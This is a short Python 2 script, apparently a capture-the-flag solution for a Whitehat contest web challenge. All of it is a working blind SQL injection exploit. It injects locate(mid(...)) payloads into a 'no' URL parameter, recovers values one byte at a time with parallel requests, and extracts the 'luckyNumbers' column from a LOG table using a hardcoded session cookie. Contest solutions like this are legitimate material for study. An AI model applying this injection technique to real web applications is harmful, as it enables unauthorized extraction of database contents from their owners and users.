import requests, urllib2
from multiprocessing import Pool


sess = requests.Session()
sess.cookies['AWSALB'] = 'aDdglZCrTXa6hAn6KtqqjtBJl2GZSo/fCgFz8Ari2ZQr5O9lrMAL5JriXGdblI1tUmuthC8erslMmSOayWaonIvWBevk5dyQnjlovRreZ5bKlzw2xT16Py6N1RyU'
def get(data):
    i, query = data
    return int(sess.get('https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/?p=statistics&no=' + urllib2.quote('locate(mid('+query+','+str(i+1)+',1),0x000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff)#')).text.split('ROUND : ')[1].split('<br>WINNER : ')[0])
def run(query, limit=None):
    global p
    if limit is None:
        limit = int(run('length(' + query + ')', 8).strip('\x00'))
    r = p.map(get, [(i, query) for i in range(limit)])
    r = [x-1 for x in r]
    print `bytearray(r)`
    return str(bytearray(r))

if __name__ == '__main__':
    p = Pool(3)
    count = int(run('(select count(1) from LOG)')) - 1
    run('(select luckyNumbers from LOG LIMIT %d,1)' % count)
